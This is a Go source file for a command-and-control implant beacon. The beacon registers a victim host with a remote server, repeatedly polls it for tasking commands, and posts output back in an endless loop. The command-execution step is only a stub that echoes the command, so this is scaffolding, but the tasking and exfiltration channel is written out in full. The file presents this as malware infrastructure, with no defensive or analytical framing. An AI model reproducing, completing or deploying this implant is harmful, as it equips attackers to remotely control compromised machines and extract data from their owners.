package implant

import (
"bytes"
"encoding/json"
"net/http"
"time"
)

type BeaconPayload struct {
ID       string `json:"id"`
Hostname string `json:"hostname"`
OS       string `json:"os"`
LastSeen int64  `json:"last_seen"`
}

type ImplantBeacon struct {
ServerURL string
AgentID   string
Interval  time.Duration
Client    *http.Client
}

func NewImplantBeacon(serverURL string, agentID string, interval time.Duration) *ImplantBeacon {
return &ImplantBeacon{
ServerURL: serverURL,
AgentID:   agentID,
Interval:  interval,
Client:    &http.Client{Timeout: 15 * time.Second},
}
}

func (i *ImplantBeacon) Register() bool {
payload := BeaconPayload{
ID:       i.AgentID,
Hostname: "target-host",
OS:       "windows",
LastSeen: time.Now().Unix(),
}
body, _ := json.Marshal(payload)
resp, err := http.Post(i.ServerURL+"/register", "application/json", bytes.NewBuffer(body))
if err != nil {
return false
}
defer resp.Body.Close()
return resp.StatusCode == http.StatusOK
}

func (i *ImplantBeacon) CheckIn() (string, error) {
payload := map[string]string{
"agent_id": i.AgentID,
}
body, _ := json.Marshal(payload)
resp, err := http.Post(i.ServerURL+"/task", "application/json", bytes.NewBuffer(body))
if err != nil {
return "", err
}
defer resp.Body.Close()
var result map[string]interface{}
json.NewDecoder(resp.Body).Decode(&result)
if cmd, ok := result["command"].(string); ok {
return cmd, nil
}
return "", nil
}

func (i *ImplantBeacon) SendResult(output string) bool {
payload := map[string]string{
"agent_id": i.AgentID,
"output":   output,
}
body, _ := json.Marshal(payload)
resp, err := http.Post(i.ServerURL+"/result", "application/json", bytes.NewBuffer(body))
if err != nil {
return false
}
defer resp.Body.Close()
return resp.StatusCode == http.StatusOK
}

func (i *ImplantBeacon) StartBeacon() {
for {
cmd, _ := i.CheckIn()
if cmd != "" {
i.SendResult("Executing: " + cmd)
}
time.Sleep(i.Interval)
}
}

func (i *ImplantBeacon) GetAgentID() string {
return i.AgentID
}

func (i *ImplantBeacon) GetServerURL() string {
return i.ServerURL
}
